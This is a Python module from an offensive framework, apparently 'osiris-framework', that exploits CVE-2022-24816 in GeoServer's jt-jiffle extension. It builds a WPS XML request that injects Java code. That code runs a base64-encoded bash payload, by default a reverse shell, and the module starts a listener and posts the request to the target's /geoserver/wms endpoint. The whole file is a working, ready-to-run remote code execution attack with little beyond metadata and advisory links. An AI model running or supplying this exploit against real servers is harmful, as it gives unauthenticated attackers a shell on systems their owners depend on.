#!/usr/bin/env python3
# Project: osiris-framework
# Author: Samir Sanchez Garnica @sasaga92
# Version 1.0
# Date: 07/01/2023

import requests
from core.ModuleObtainer import obtainer
from core.Processor import processor
from core.generator.Generator import generator
from core.generator.Ofuscator import ofuscator
from utilities.Tools import tools
from utilities.Messages import print_message

print_message.name_module = __file__

info = {
    'author': 'Samir Sanchez Garnica and Luis Jacome Valencia',
    'date': '07/01/2023',
    'rank': 'Excellent',
    'category': 'Exploit',
    'path': 'exploits/http/geoserver/jt-jiffle/os_command_injection_cve_2022_24816.py',
    'license': 'GPL-2.0',
    'description': 'This vulnerability is a code injection flaw in jt-jiffle that leads to an unauthenticated remote code execution.',
    'references': ['https://www.synacktiv.com/en/publications/exploiting-cve-2022-24816-a-code-injection-in-the-jt-jiffle-extension-of-geoserver.html','https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24816']
}

options = {
    'target': ['Yes', 'set target to attack', ''],
    'platform': ['Yes', 'set id target to attack', '0'],
    'payload': ['Yes', 'Set payload attack software', 'cmd/unix/reverse/bash_i'],
}

extra_info = {
    'cve': ['CVE-2022-24816'],
    'targets': ['GNU/Linux']
}

required = {
    'start_required': 'True',
    'check_required': 'False'
}


def exploit():
    try:
        print_message.start_execution()
        __target = tools.http_or_https(obtainer.options['target'][2])

        if __target['code'] == 200:
            __url = obtainer.options['target'][2] + "/geoserver/wms"
            __payload_generate = ofuscator.base64_encode(generator.generator_payload(options_payload=obtainer.options_payload,
                                                             options_exploit=obtainer.options,
                                                             extra_info=extra_info)['message'])['message']
            __payload = f"<?xml version=\"1.0\" encoding=\"UTF-8\"?><wps:Execute version=\"1.0.0\" service=\"WPS\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns=\"http://www.opengis.net/wps/1.0.0\" xmlns:wfs=\"http://www.opengis.net/wfs\" xmlns:wps=\"http://www.opengis.net/wps/1.0.0\" xmlns:ows=\"http://www.opengis.net/ows/1.1\" xmlns:gml=\"http://www.opengis.net/gml\" xmlns:ogc=\"http://www.opengis.net/ogc\" xmlns:wcs=\"http://www.opengis.net/wcs/1.1.1\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" xsi:schemaLocation=\"http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd\">\r\n  <ows:Identifier>ras:Jiffle</ows:Identifier>\r\n  <wps:DataInputs>\r\n    <wps:Input>\r\n      <ows:Identifier>coverage</ows:Identifier>\r\n      <wps:Data>\r\n        <wps:ComplexData mimeType=\"application/arcgrid\"><![CDATA[ncols 720 nrows 320 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999 316]]></wps:ComplexData>\r\n      </wps:Data>\r\n    </wps:Input>\r\n    <wps:Input>\r\n      <ows:Identifier>script</ows:Identifier>\r\n      <wps:Data>\r\n        <wps:LiteralData>dest = y() - (500); // */ public class Double {{    public static double NaN = 0;  static {{ try {{  java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"bash -c {{echo,{__payload_generate}}}|{{base64,-d}}|{{bash,-i}}\").getInputStream())); String line = null; String allLines = \" - \"; while ((line = reader.readLine()) != null) {{ allLines += line; }} throw new RuntimeException(allLines);}} catch (java.io.IOException e) {{}} }}}} /**</wps:LiteralData>\r\n      </wps:Data>\r\n    </wps:Input>\r\n    <wps:Input>\r\n      <ows:Identifier>outputType</ows:Identifier>\r\n      <wps:Data>\r\n        <wps:LiteralData>DOUBLE</wps:LiteralData>\r\n      </wps:Data>\r\n    </wps:Input>\r\n  </wps:DataInputs>\r\n  <wps:ResponseForm>\r\n    <wps:RawDataOutput mimeType=\"image/tiff\">\r\n      <ows:Identifier>result</ows:Identifier>\r\n    </wps:RawDataOutput>\r\n  </wps:ResponseForm>\r\n</wps:Execute>\r\n"

            processor.multi_handler(payload_options=obtainer.options_payload,
                                    exploit_options=obtainer.options)
            __headers = {
                'Host': obtainer.options['target'][2].split("//")[1].split('/')[0],
                'Content-Length': str(len(__payload)),
                'Content-Type': 'text/plain',
                'Cookie': 'GS_FLOW_CONTROL=GS_CFLOW_-77161451:18587cd462e:-7fc1'
            }

            print_message.execution_info("Triggering vulnerability and getting shell...")
            __response = requests.post(url=__url, headers=__headers, data=str(__payload), timeout=5)
            if requests.post(url=__url, data=__payload, headers=__headers).status_code == 200:
                print_message.execution_info("Exploit Successful...")

        else:
            print_message.execution_error("The URL must be in the format http:// or https://")
            return False
    except Exception as Error:
        pass

def check():
    pass